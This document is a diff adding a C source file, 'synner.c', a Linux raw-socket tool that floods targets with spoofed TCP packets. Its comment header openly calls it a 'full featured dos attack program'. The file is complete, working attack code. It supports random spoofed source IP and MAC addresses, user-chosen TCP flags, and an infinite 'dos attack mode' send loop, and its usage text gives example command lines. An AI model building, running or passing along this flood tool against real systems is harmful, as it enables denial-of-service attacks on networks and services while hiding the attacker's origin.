@@ -1,0 +1,407 @@
+/*
+sm4x - 2008
+	"synner.c" linux/x86
+	- part of my personal toolchain - released public ;)
+	- synner is able to send mass amounts of spoofed (mac/ip) eth->ip->tcp packets with user defined:
+		- source ips, tcp flags, window sizes, payload sizes, sequences ids, ack ids 
+	- developed as a quick internal firewall/IDS testing prog but soon mutated into a full featured dos attack program.as during
+      testing I found it to literally destroy some of my fbsd/linux/openSol/win2k8 boxes at work
+	- many bugs are present so feel free to fix and/or comment...
+	v1.1 enjoy ;)
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#include <netinet/ip.h>
+#include <netinet/in.h>
+//#include <netinet/tcp.h>
+
+#include <net/if.h>
+#include <net/ethernet.h>
+#include <linux/if_packet.h>
+
+#include <time.h>
+#include <unistd.h>
+#include <signal.h>
+
+/* tcp hdr */
+struct tcphdr {
+	unsigned short source;
+	unsigned short dest;
+	unsigned long seq;
+	unsigned long ack_seq;
+	unsigned char len;
+#  if __BYTE_ORDER == __LITTLE_ENDIAN
+    u_int16_t fin:1;
+    u_int16_t syn:1;
+    u_int16_t rst:1;
+    u_int16_t psh:1;
+    u_int16_t ack:1;
+    u_int16_t urg:1;
+    u_int16_t res2:2;
+#  elif __BYTE_ORDER == __BIG_ENDIAN
+    u_int16_t res2:2;
+    u_int16_t urg:1;
+    u_int16_t ack:1;
+    u_int16_t psh:1;
+    u_int16_t rst:1;
+    u_int16_t syn:1;
+    u_int16_t fin:1;
+#  else
+#   error "Adjust your <bits/endian.h> defines"
+#  endif	
+	unsigned short window;
+	unsigned short check;
+    unsigned short urg_ptr;
+};
+
+unsigned short calc_checksum(unsigned char *, int );
+int count = 0;
+
+/***********************************************************
+* signalHandler
+***********************************************************/
+void signalHandler(int signal) {
+	time_t raw_t;
+	struct tm *timeinfo; char date[64];
+	time(&raw_t); timeinfo = localtime(&raw_t);
+	memset(date, 0x0, 64); strftime(date, 63, "%c", timeinfo);	
+	printf("\n[+] PUNT!\n");
+	printf("[+] [%s] Sent %d packets.\n", date, count);
+	cleanup:
+		exit(0);
+}
+
+/**********************************************************
+* usage
+***********************************************************/
+void usage() {
+	printf("[+] Usage:\n");
+	printf("[+] ./synner -i<iface> -s<IP> -S<MAC> -d<IP> -D<MAC> <options>\n");
+	printf("[+]		-i\tinterface name\n");
+	printf("[+]		-x\twhile(1) !! dos attack mode\n");
+	printf("[+]		\t\t-amount of packets (ie: -x10000, -x0 for infinite)\n");
+	printf("[+]		-s\tsource ip (spoofed)\n");
+	printf("[+]		\t\t-(r)andom source ip\n");
+	printf("[+]		-S\tsource MAC (spoofed)\n");
+	printf("[+]		-d\tdest ip\n");
+	printf("[+]		-D\tdest MAC\n");
+	printf("[+]		-u\tsource port\n");
+	printf("[+]		-p\tdest port\n");
+	printf("[+]		-l\tpayload length (packet size filled with \\x00)\n");
+	printf("[+]		-w\twindow size (<=65535)\n");
+	printf("[+]		-f\tflags (s,a:p:u,r:f)\n");
+	printf("[+]		\t\t-(s)yn, (a)ck, (p)push, (u)rgent, (r)eset, (f)in, (x)=ALL\n");
+	printf("[+] eg:\n");
+	printf("[+] ./synner -ieth0 -x -s192.168.1.1 -S00:AA:BB:CC:00:00 -d192.168.1.219 -D00:dd:ee:aa:dd:bb -p 6984 -l 512 -u5555 -fas\n");
+	printf("[+] ./synner -ieth0 -sr -S00:dd:ee:aa:dd:ff -d192.168.1.219 -D00:dd:ee:aa:dd:bb -p80 -u500 -fx\n\n");
+	exit(0);
+}
+
+/**********************************************************
+* main
+***********************************************************/
+int main(int argc, char **argv) {
+	int bytes_sent = 0; int err = 0; int sock = 0; int ok_count = 0; int iface_num = 0;	int packet_count = 0;
+	int dst_port = 666; int src_port = 2048; int is_verbose = 0; int payload_len = 32;
+ 	int window_len = 1024; int dos_mode = 0; int use_random_source_ip = 0; int use_random_source_mac = 0;
+	int flag_syn = 0; int flag_ack = 0; int flag_push = 0; int flag_urg = 0; int flag_rst = 0; int flag_fin = 0;
+
+	time_t raw_t;
+	struct tm *timeinfo;
+	struct sockaddr_ll sa;
+	struct ether_header eth_hdr;
+	struct iphdr ip_hdr;
+	struct tcphdr tcp_hdr;
+
+	char date[64]; char random_ips[1000*16];
+	char *iface = NULL; char *flgs = NULL;
+	char *src_ip = NULL; char *dest_ip = NULL;
+	char *src_mac = NULL; char *dest_mac = NULL;
+
+	if(getuid()) { printf("[-] Sorry d00d - gotta be r00t.\n"); return -1; }
+	printf("[+] synner by sm4x -> b0h!i!i\n");
+
+	if(signal(SIGINT, signalHandler) == SIG_IGN) { 
+		printf("[+] Signal handlers are attached..\n");
+		signal (SIGINT, SIG_IGN); 
+	}
+
+	// little big gross but it was written really REALLY fast ;)
+	opterr = 0; int option = 1;
+	while((option = getopt(argc, argv, "vi:x:s:S:d:D:u:p:l:w:f:?")) != -1 ) {
+		switch(option) {
+		case 'i':			
+			iface = optarg;
+			printf("[+] Using: %s ", iface);
+			if(if_nametoindex(iface) == 0) { printf(" => INTERFACE NO GOOD!!\n"); exit(1); }
+			printf("OK.\n"); ok_count++;
+
+		break;
+		case 'x':
+			dos_mode = 1;
+			char *c = optarg;
+			if(c != NULL && atoi(c) > 0) { 
+				packet_count = atoi(c); 
+				printf("[+] Warning - DOS mode active (%d packets)!\n", packet_count);
+			} else {
+				printf("[+] Warning - DOS mode active!\n");	
+			}
+		break;
+		case 's':
+			src_ip = optarg;
+			//printf("OPTARG: %s\n", src_ip);
+			if(src_ip[0] == 'r') { 
+				printf("[+] Using random source IP(s)\n");
+				use_random_source_ip = 1;
+			} else {
+				printf("[+] Source IP: %s\n", src_ip);
+			} ok_count++;
+		break;
+		case 'S':
+			src_mac = optarg; 
+			if(src_mac[0] == 'r') { 
+				printf("[+] Using random source MAC(s)\n");
+					use_random_source_mac = 1;
+			} else {
+				printf("[+] Source MAC: %s\n", src_mac);
+			} ok_count++;
+		break;
+		case 'd':
+			dest_ip = optarg; ok_count++;
+			printf("[+] Dest IP: %s\n", dest_ip);	
+		break;
+		case 'D':
+			dest_mac = optarg; ok_count++;
+			printf("[+] Dest MAC: %s\n", dest_mac);	
+		break;
+		case 'p':
+			dst_port = atoi(optarg);
+			printf("[+] Dest port: %d\n", dst_port);
+		break;
+		case 'u':
+			src_port = atoi(optarg);
+			printf("[+] Source port: %d\n", src_port);
+		break;
+		
+		case 'l':
+			payload_len = atoi(optarg); 
+			printf("[+] Payload length: %d octets\n", payload_len);
+		break;
+		case 'w':
+			window_len = atoi(optarg);
+			if(window_len > 65535) { window_len = 65535; }
+			printf("[+] TCP Window length: %d octets\n", window_len);
+		break;
+		case 'f':
+			flgs = &optarg[0];
+			if(flgs != NULL) {
+				printf("[+] FLAGS: ");
+				while(*flgs) {
+					switch(*flgs) {
+						case 'x':
+							flag_syn = 1; flag_ack = 1; flag_push = 1; flag_urg = 1; flag_rst = 1; flag_fin = 1;
+							printf(" SYN|ACK|PSH|URG|RST|FIN");
+						flgs++; break;
+						case 's':
+							flag_syn = 1; printf("|SYN");
+						flgs++; break;
+						case 'a':
+							flag_ack = 1; printf("|ACK");
+						flgs++; break;
+						case 'p':
+							flag_push = 1; printf("|PSH");
+						flgs++; break;
+						case 'u':
+							flag_urg = 1; printf("|URG");
+						flgs++; break;
+						case 'f':
+							flag_fin = 1; printf("|FIN");
+						flgs++; break;
+						case 'r':
+							flag_rst = 1; printf("|RST");
+						flgs++; break;
+					}
+				} printf("\n");
+			} else {
+				printf("[+] Default: SYN/ACK flags are set!\n");
+				flag_syn = 1; flag_ack = 1;
+			}
+		break;
+		case 'v':
+			is_verbose = 1;
+			printf("[+] Vebosity is ON\n");
+		break;
+		}
+
+	}
+
+	if(ok_count < 5 || src_ip == NULL || dest_ip == NULL || src_mac == NULL || dest_mac == NULL) { 
+		printf("[-] Invalid options supplied!\n");
+		usage(); 
+	}
+	/* define (new ??) packet */
+	char packet[sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr ) + payload_len];
+
+	iface_num = if_nametoindex(iface);
+	if(iface_num == 0) { printf("[-] IFACE %s IS REPORTED DOWN -> trying anyway.!\n", iface); }
+	
+	/* as raw as we can get */
+	sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+	if (sock < 0) { printf("[-] Unable to open a socket!?\n"); goto cleanup; }	
+
+	// b/c we want high speed sendto() we need to build this before the while(1)
+	if(use_random_source_ip) {
+		memset(random_ips, 0x0, (1000*16));
+		int seed = time(NULL); int i = 0;
+		printf("[+] Generating random source IP(s)\n");
+		if(dos_mode) {
+			for(i = 0; i < 1000; i++ ) {
+				srand(seed+i);
+				int num1 = 0, num2 = 0, num3 = 0, num4 = 0;
+				num1 = rand()%254; num2 = rand()%254; num3 = rand()%254; num4 = rand()%254;
+				sprintf(random_ips+(i*16), "%d.%d.%d.%d\0", num1, num2, num3, num4);
+				//printf("RANDOMIP: %s\n", random_ips+(i*16));
+			} 
+		} else {
+			int num1 = 0, num2 = 0, num3 = 0, num4 = 0;
+			srand(seed); num1 = rand()%254; num2 = rand()%254; num3 = rand()%254; num4 = rand()%254;
+			sprintf(random_ips, "%d.%d.%d.%d\0", num1, num2, num3, num4);
+			printf("[+] Random source IP: %s\n", random_ips);
+		} src_ip = random_ips;
+	}
+
+	if(is_verbose ==1 ) { printf("[+] Buliding payload...\n"); }
+	int len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
+	memset(&packet, 0x0, len);
+
+	/* raw communication */
+	sa.sll_family = AF_PACKET;
+	sa.sll_protocol = htons(ETH_P_IP);
+	sa.sll_ifindex = iface_num;
+	sa.sll_hatype = 0x0000;
+	sa.sll_pkttype = 0x01;
+	sa.sll_halen = ETH_ALEN;
+	
+	memset(&eth_hdr, 0x0, sizeof(struct ether_header));
+
+	/* ethernet frame setup*/
+	eth_hdr.ether_type = htons(ETHERTYPE_IP);
+	
+	/* copy our source and dest hosts */
+	if((void *)ether_aton(dest_mac) == NULL) { printf("[-] Invalid dest mac address!\n"); goto cleanup; }
+	if(!use_random_source_mac && (void *)ether_aton(src_mac) == NULL) { printf("[-] Invalid source mac address!\n"); goto cleanup; }
+
+	memcpy(&eth_hdr.ether_dhost, (void *)ether_aton(dest_mac), 6);
+    memcpy(&eth_hdr.ether_shost, (void *)ether_aton(src_mac), 6);
+	
+	memset(&ip_hdr, 0x0, sizeof(struct iphdr));
+	memset(&tcp_hdr, 0x0, sizeof(struct tcphdr));
+
+	/* ip frame setup */
+	ip_hdr.ihl = 0x05;
+	ip_hdr.version = 0x04;
+	ip_hdr.id = 0x00;
+	ip_hdr.tot_len = htons(len);
+	ip_hdr.frag_off = 0x00;
+	ip_hdr.ttl = 0x40;
+	ip_hdr.protocol = 0x06;
+
+	// inet_addr broadcast returns -1 so we guard
+	if(use_random_source_ip == 0 && strstr(src_ip, "255.255.255.255") == NULL) {
+		if(inet_addr(src_ip) == -1) { printf("[-] Invalid source ip!\n"); goto cleanup; }
+	}
+	if(inet_addr(dest_ip) == -1) { printf("[-] Invalid dest ip!\n"); goto cleanup; }
+
+	ip_hdr.saddr = inet_addr(src_ip);
+	ip_hdr.daddr = inet_addr(dest_ip);
+	ip_hdr.check = (unsigned short)calc_checksum((void *)&ip_hdr, sizeof(struct iphdr));
+
+	tcp_hdr.source = htons(src_port);
+	tcp_hdr.dest = htons(dst_port);
+	
+	/* SEQ and ACK */
+	tcp_hdr.seq = htonl(rand()%65535);
+	tcp_hdr.ack_seq = htonl(rand()%65535);
+	
+	/* syn and ack flags set */
+	tcp_hdr.syn = flag_syn; tcp_hdr.ack = flag_ack; tcp_hdr.fin = flag_fin; 
+	tcp_hdr.rst = flag_rst; tcp_hdr.psh = flag_push; tcp_hdr.urg = flag_urg;
+ 	//tcp_hdr.len = htons(0x80);
+	tcp_hdr.len = 0x80;	
+
+	tcp_hdr.window = htons(window_len);
+	
+	/* incorrect checksum (assumes offload)-> (make sure add pseudo header etc...) */
+	tcp_hdr.check = 0x00;
+
+	memcpy(packet, &eth_hdr, sizeof(struct ether_header));
+	memcpy(packet+sizeof(struct ether_header), &ip_hdr, sizeof(struct iphdr));
+	memcpy(packet+sizeof(struct ether_header)+sizeof(struct iphdr), &tcp_hdr, sizeof(struct tcphdr));
+
+	if(is_verbose == 1) { printf("[+] Configuration ok!\n"); }
+	time(&raw_t); timeinfo = localtime(&raw_t);
+	memset(date, 0x0, 64);
+	strftime(date, 63, "%c", timeinfo);	
+	printf("[+] [%s] Beginning send(s) now (h0ld it y00z)...\n", date);
+
+	int eth_len = sizeof(struct ether_header);
+	/*send the packet(s) */
+	count = 0; int i = 0;
+	if(dos_mode) {
+		int seed = time(NULL);
+		while(1) {
+			/* this is really messy - ugh */
+			if(use_random_source_ip) {
+				if(i > 1000) { i = 0; }
+				//printf("%d) IP: %s\n", i, random_ips+(i*16));
+				tcp_hdr.seq = i<<4; tcp_hdr.ack_seq = i<<4; // random junk for seq/ack
+				ip_hdr.saddr = inet_addr(random_ips+(i*16));
+				ip_hdr.check = (unsigned short)calc_checksum((void *)&ip_hdr, sizeof(struct iphdr));
+				// should set he packet via packet offset directly
+				memcpy(packet+eth_len, &ip_hdr, sizeof(struct iphdr)); i++;
+			}
+
+			bytes_sent = sendto(sock, packet, len, 0, (struct sockaddr*) &sa, sizeof(sa)); count++;
+			if (bytes_sent < 0) { if(is_verbose) { printf("[-] (%d) Unable to send syn packet!\n", count); } usleep(100); }	
+			if(packet_count != 0 && count >= packet_count) { goto cleanup; } 
+		}
+	} else {
+		bytes_sent = sendto(sock, packet, len, 0, (struct sockaddr*) &sa, sizeof(sa));
+		if (bytes_sent < 0) { if(is_verbose) { printf("[-] (%d) Unable to send syn packet!\n", count); } goto cleanup; }	
+		printf("[+] Sent: %d bytes\n", bytes_sent); count++;
+	}
+
+	/* cleanup */
+	cleanup:
+		time(&raw_t); timeinfo = localtime(&raw_t);
+		memset(date, 0x0, 64);
+		strftime(date, 63, "%c", timeinfo);	
+		printf("[+] [%s] Done: %d packets sent.\n", date, count);
+		close(sock);
+		return 0;
+}
+
+/**********************************************************
+* checksum
+**********************************************************/
+unsigned short calc_checksum(unsigned char* data, int len) {
+  int i = 0; unsigned long sum = 0;
+  	/* (going by 16bits) not the len of data (8 bit count from sizeof()) */
+	if((len & 1) == 0) { len = len >> 1; } else { len = (len >> 1) + 1; }
+	
+	/* chop through the data 16bits and add to the 32 bit accumulator */
+	for(i = 0; i < len; i++) {
+		sum += *((unsigned short *)data); data += 2;
+	}
+	/* add the carries */
+	sum = (sum >> 16) + (sum & 0xffff);
+  	sum += (sum >> 16);
+  return (~sum);
+}
+
+// done
